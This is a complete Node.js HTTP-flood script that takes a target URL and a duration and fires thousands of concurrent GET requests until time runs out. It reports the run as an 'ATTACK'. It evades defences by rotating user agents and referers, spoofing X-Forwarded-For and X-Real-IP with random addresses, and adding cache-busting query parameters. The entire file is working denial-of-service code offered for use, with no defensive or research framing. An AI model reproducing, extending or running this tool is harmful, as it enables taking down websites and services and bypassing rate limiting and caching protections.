const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');

const REFERERS = fs.readFileSync('refs.txt', 'utf8').split('\n').filter(Boolean);
const USER_AGENTS = fs.readFileSync('ua.txt', 'utf8').split('\n').filter(Boolean);

const keepAliveHttp = new http.Agent({ keepAlive: true, maxSockets: Infinity });
const keepAliveHttps = new https.Agent({ keepAlive: true, maxSockets: Infinity });

const target = process.argv[2];
const duration = parseInt(process.argv[3]);

if (!target || isNaN(duration)) {
  console.log('Usage: node flood.js <url> <time_in_seconds>');
  process.exit(1);
}

let stats = {
  total: 0,
  success: 0,
  error: 0,
  peakRps: 0
};

const startTime = Date.now();
const endTime = startTime + duration * 1000;

function getRandomUA() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
}

function getRandomRef() {
  return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
}

function makeRequest() {
  const ip = Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.');
  const headers = {
    'User-Agent': getRandomUA(),
    'Referer': getRandomRef(),
    'X-Forwarded-For': ip,
    'X-Real-IP': ip,
    'Accept': '*/*',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Connection': 'keep-alive'
  };

  const noisyURL = target + (target.includes('?') ? '&' : '?') + 'cb=' + Math.random().toString(36).substring(7);

  axios.get(noisyURL, {
    headers,
    timeout: 5000,
    httpAgent: keepAliveHttp,
    httpsAgent: keepAliveHttps,
    validateStatus: null
  }).then(res => {
    stats.success++;
  }).catch(err => {
    stats.error++;
  }).finally(() => {
    stats.total++;
    if (Date.now() < endTime) {
      setImmediate(makeRequest);
    }
  });
}

console.clear();
console.log('\n  RAW FLOOD MODE - PURE FIRE\n');
console.log(`  TARGET: ${target}`);
console.log(`  TIME:   ${duration}s`);
console.log('  ============================================\n');

let lastCount = 0;
const statInterval = setInterval(() => {
  const elapsed = (Date.now() - startTime) / 1000;
  const rps = (stats.total - lastCount) / 5;
  stats.peakRps = Math.max(stats.peakRps, rps);
  lastCount = stats.total;

  process.stdout.write(
    `\r  SENT: ${stats.total} | 200 OK: ${stats.success} | ERR: ${stats.error} | RPS: ${rps.toFixed(1)} `
  );
}, 5000);

for (let i = 0; i < 10000; i++) {
  makeRequest();
}

setTimeout(() => {
  clearInterval(statInterval);
  const elapsed = (Date.now() - startTime) / 1000;
  const avgRps = stats.total / elapsed;

  console.log('\n\n  ATTACK DONE');
  console.log('  ============================================');
  console.log(`  TIME:      ${elapsed.toFixed(1)}s`);
  console.log(`  TOTAL:     ${stats.total}`);
  console.log(`  SUCCESS:   ${stats.success}`);
  console.log(`  ERRORS:    ${stats.error}`);
  console.log(`  AVG RPS:   ${avgRps.toFixed(1)}`);
  console.log(`  PEAK RPS:  ${stats.peakRps.toFixed(1)}`);
  console.log('  ============================================\n');
  process.exit();
}, duration * 1000);
